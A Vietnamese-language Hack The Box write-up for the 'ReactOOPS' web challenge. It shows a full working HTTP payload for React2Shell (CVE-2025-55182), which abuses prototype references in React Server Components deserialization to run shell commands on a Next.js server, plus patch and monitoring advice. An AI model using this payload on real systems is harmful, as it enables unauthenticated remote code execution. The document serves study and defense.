---
title: "ReactOOPS"
description: "Khai thác React2Shell (CVE-2025-55182) trong React Server Components để thực thi lệnh không cần xác thực và đọc flag."
platform: "Hack The Box"
category: "Web"
difficulty: "Easy"
publishedAt: 2026-08-01
tags: ["web", "react", "nextjs", "rsc", "react2shell", "cve-2025-55182", "rce", "deserialization"]
language: "vi"
translationKey: "hack-the-box/reactoops"
draft: false
featured: true
cover: "/images/reactoops/reactoops-02.png"
---

> Bài viết này chỉ ghi lại quá trình khai thác trong môi trường lab Hack The Box đã cấp quyền. Đừng thử payload này trên hệ thống không thuộc phạm vi kiểm thử của bạn.

## Tổng quan

ReactOOPS là challenge Hack The Box dựng một ứng dụng Next.js dễ tổn thương để thực hành khai thác React2Shell, lỗi được theo dõi là CVE-2025-55182. Lỗ hổng nằm ở cách React Server Components giải mã payload gửi tới React Server Functions, cho phép thực thi mã từ xa trước xác thực khi ứng dụng dùng các gói RSC bị ảnh hưởng.

Challenge: [ReactOOPS](https://app.hackthebox.com/challenges/ReactOOPS?tab=play_challenge)

Các điểm chính:

- CVE-2025-55182 có điểm CVSS 10.0 và thuộc nhóm deserialization không an toàn.
- Các gói React bị ảnh hưởng gồm `react-server-dom-webpack`, `react-server-dom-parcel`, và `react-server-dom-turbopack` ở các phiên bản 19.0.0, 19.1.0, 19.1.1, 19.2.0.
- Bản vá React tương ứng là 19.0.1, 19.1.2, và 19.2.1; với Next.js, nên nâng cấp theo advisory chính thức của framework đang dùng.

## Nhận diện mục tiêu

Đầu tiên, mình kiểm tra header HTTP của instance:

```bash
curl -I http://154.57.164.82:30616/
```

![Kết quả curl header cho thấy mục tiêu chạy Next.js và có dấu hiệu RSC](/images/reactoops/reactoops-01.png)

Header trả về `X-Powered-By: Next.js`. Trường `Vary` cũng có các giá trị liên quan đến RSC như `rsc`, `next-router-state-tree`, `next-router-prefetch`, và `next-router-segment-prefetch`. Đây là dấu hiệu đủ tốt để chuyển hướng sang kiểm tra bề mặt React Server Components/Server Actions.

## Cơ chế lỗi

Payload của lab dựa trên cách React Flight xử lý các chunk và tham chiếu trong form-data. Ý tưởng là dựng một object "thenable" giả, điều khiển đường tham chiếu qua `__proto__`, rồi ép phía server đi tới `constructor:constructor`, tức `Function` constructor trong Node.js.

Trong request bên dưới:

- Header `Next-Action: x` đưa request vào nhánh xử lý Server Action.
- Trường `then` dùng chuỗi tham chiếu `$1:__proto__:then`.
- `_formData.get` trỏ tới `$1:constructor:constructor`.
- `_prefix` chứa JavaScript sẽ chạy trên server. Trong lab này, đoạn mã gọi module tạo tiến trình con của Node.js để đọc `/app/flag.txt`, sau đó ném lỗi `NEXT_REDIRECT` với `digest` chứa kết quả.

## Khai thác

Mình gửi request sau bằng Burp Repeater. Khi chạy trên instance khác, cần thay `Host`, `Content-Length`, boundary và các ID sinh theo request thực tế nếu cần.

```http
POST / HTTP/1.1
Host: 154.57.164.82:30616
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 755

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var main='main'+'Module';var mod='child'+'_process';var run='exec'+'Sync';var res=process[main].require(mod)[run]('cat /app/flag.txt',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

![Burp Repeater trả về lỗi 500 với digest chứa flag](/images/reactoops/reactoops-02.png)

Response `500 Internal Server Error` là kết quả mong đợi trong cách khai thác này, vì payload cố tình ném `NEXT_REDIRECT`. Phần quan trọng là `digest` trong response đã phản chiếu output của lệnh `cat /app/flag.txt`.

## Flag

```text
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1tlc4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```

## Phòng thủ

Cách xử lý đúng là vá dependency bị ảnh hưởng, không dựa vào filter payload hay WAF như biện pháp chính. Với React RSC, hãy nâng cấp các gói `react-server-dom-*` tối thiểu lên bản đã vá; với Next.js, đi theo nhánh vá chính thức và ưu tiên bản supported mới nhất.

Sau khi vá, nên xoay vòng secret nếu ứng dụng có khả năng đã bị khai thác, vì đây là RCE trước xác thực. Ở tầng giám sát, cần chú ý các POST bất thường có `Next-Action`, payload form-data chứa `__proto__`, `constructor:constructor`, lời gọi tạo tiến trình con của Node.js, hoặc outbound connection lạ từ server ứng dụng.

## Bài học

ReactOOPS cho thấy chỉ một header framework như `X-Powered-By: Next.js` cùng vài tín hiệu RSC trong `Vary` đã đủ để định hướng khai thác. Với các lỗ hổng ở tầng framework, việc nhận diện đúng runtime quan trọng không kém việc có payload: khi đã khớp bề mặt RSC/Server Actions, phần còn lại là kiểm soát luồng deserialize để đưa lệnh vào server.

## Tài liệu tham khảo

- [React: Critical Security Vulnerability in React Server Components](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [GitHub Security Advisory GHSA-fv66-9v8q-g76r](https://github.com/facebook/react/security/advisories/GHSA-fv66-9v8q-g76r)
- [Next.js advisory for React2Shell impact](https://nextjs.org/blog/CVE-2025-66478)
- [Hack The Box: React2Shell CVE-2025-55182 threat spotlight](https://www.hackthebox.com/blog/react2shell-cve-2025-55182-threat-spotlight)
- [Hack The Box ReactOOPS challenge](https://app.hackthebox.com/challenges/ReactOOPS?tab=play_challenge)
